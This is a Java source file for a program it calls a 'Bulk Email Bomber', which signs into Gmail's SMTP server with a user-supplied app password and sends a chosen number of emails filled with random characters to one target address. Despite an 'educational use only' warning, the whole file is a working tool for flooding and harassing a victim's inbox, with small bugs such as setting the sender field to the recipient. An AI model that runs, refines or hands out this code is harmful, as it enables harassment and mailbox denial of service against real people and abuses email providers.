package com.github.GraycenMacNeill.BulkEmailBomber; // This package contains the main class for the Bulk Email Bomber program.

import javax.mail.*; // For sending emails
import javax.mail.internet.*; // For backwards compatibility
import java.util.*; // Import for handling emails, scanner, and MIME types
import java.util.concurrent.ThreadLocalRandom; // Import for random number generation

public class Main {

    public static void main(String[] args) {

        displayInformation(); // Display GitHub repository link and legal cautions when using the program.

        // Creates a new UserInteraction object to get user input
        UserInteraction userInteraction = new UserInteraction();

        String senderEmail = userInteraction.getSenderEmail(); // Get sender email
        String recipientEmail = userInteraction.getRecipientEmail(); // Get the recipient email
        String password = userInteraction.getPassword(); // Get the Gmail App Password
        int numberOfEmailsToSend = userInteraction.getNumberOfEmailsToSend(); // Get number of emails to send

        // The list of different ASCII characters, letters, numbers, and symbols, and words for
        // the body and subject of the emails.
        String subjectBase = "! @ # $ % ^ & * ( ) - _ = + [ { } ; ' : , . < > / ? Ω ≈ ç √ ı ˜ Â Ò ˚ Ô Ó © Ï Î Í Å ∏ Ø ˆ ¨ Á † ® ´ ∑ Œ a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z apple banana cherry date egg frog grape honey imitation jackfruit kangaroo lemon mango orange pear peach plum pineapple queen rabbit raspberry strawberry tangerine watermelon xanadu yogurt ⴀ ⴁ ⴂ ⴃ ⴄ ⴅ ⴆ ⴡ ⴇ ⴈ ⴉ ⴊ ⴋ ⴌ ⴢ ⴍ ⴎ ⴏ ⴐ ⴑ ⴒ ⴣ ⴓ ⴔ ⴕ ⴖ ⴗ ⴘ ⴙ ⴚ ⴛ ⴜ ⴝ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒";
        String bodyBase = "! @ # $ % ^ & * ( ) - _ = + [ { } ; ' : , . < > / ? Ω ≈ ç √ ı ˜ Â Ò ˚ Ô Ó © Ï Î Í Å ∏ Ø ˆ ¨ Á † ® ´ ∑ Œ a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z apple banana cherry date egg frog grape honey imitation jackfruit kangaroo lemon mango orange pear peach plum pineapple queen rabbit raspberry strawberry tangerine watermelon xanadu yogurt ⴀ ⴁ ⴂ ⴃ ⴄ ⴅ ⴆ ⴡ ⴇ ⴈ ⴉ ⴊ ⴋ ⴌ ⴢ ⴍ ⴎ ⴏ ⴐ ⴑ ⴒ ⴣ ⴓ ⴔ ⴕ ⴖ ⴗ ⴘ ⴙ ⴚ ⴛ ⴜ ⴝ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒ ▒";

        // Gmail configuration (use Gmail's implemented App Password)
        Properties mailProps = new Properties();
        mailProps.put("mail.smtp.host", "smtp.gmail.com");
        mailProps.put("mail.smtp.port", 587);
        mailProps.put("mail.smtp.auth", true);
        mailProps.put("mail.smtp.starttls.enable", true);

        // Create a Session object with password authentication
        // This will be replaced with your Gmail App Password
        Session session = Session.getInstance(mailProps, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return
                new PasswordAuthentication(senderEmail, password); // Use the password variable
            }
        });

        // Loop to send emails
        // Generate random strings for subject and body
        // This could be optimized by using a more efficient data structure or algorithm
        for (int i = 0; i < numberOfEmailsToSend; i++) {
            try {
                // Create a new message object for each email
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(recipientEmail));

                // Generate random subject and body variations
                // Consider using a more efficient data structure or algorithm for generating random strings
                String randomSubject = generateRandomString(subjectBase);
                String randomBody = generateRandomString(bodyBase);

                message.setSubject(randomSubject);
                message.setText(randomBody);

                // Update recipient address
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail));

                // Transmit the message through the Transport object and sends to the
                // recipient's email address.
                Transport.send(message);
                System.out.println("Email sent to " + senderEmail);
            } catch (MessagingException e) {
                System.err.println("An error occurred while sending the email: " + e.getMessage());
            }

        }

    }

    // Function to generate random string with a specified base string
    // This function generates a random string of characters from the provided
    // variables baseBody and baseSubject.
    public static String generateRandomString(String baseString) {
        int randomLength = ThreadLocalRandom.current().nextInt(baseString.length() + 3); // Generate random length up to 5 characters longer than base
        StringBuilder randomStringBuilder = new StringBuilder(randomLength);
        for (int j = 0; j < randomLength; j++) {
            int randomIndex = ThreadLocalRandom.current().nextInt(baseString.length());
            randomStringBuilder.append(baseString.charAt(randomIndex));
        }
        return randomStringBuilder.toString();
    }

    // Function to display program information and legal cautions
    public static void displayInformation() {
        System.out.println("https://github.com/GraycenMacNeill/BulkEmailBomber");
        System.out.println("\u001B[31m" + "\nWARNING: This application is designed for educational and experimental use only. Any unauthorized or");
        System.out.println("malicious use of this code is strictly prohibited and may violate applicable data protection laws,");
        System.out.println("such as the CAN-SPAM Act. Such misuse could result in legal penalties, depending on your jurisdiction." + "\u001B[0m");
    }


}